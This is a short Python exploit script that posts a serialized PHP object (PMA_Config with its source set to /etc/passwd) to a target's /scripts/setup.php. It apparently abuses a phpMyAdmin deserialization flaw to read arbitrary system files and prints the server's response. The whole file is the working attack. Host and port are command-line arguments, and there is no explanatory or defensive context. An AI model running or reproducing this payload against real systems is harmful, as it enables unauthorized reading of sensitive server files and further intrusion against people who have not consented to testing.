import requests
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8983', help='Target port (default: 8983)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port

# Define the target URL
url = f"http://{host}:{port}/scripts/setup.php"

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\";s:11:\"/etc/passwd\";}"

response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.text)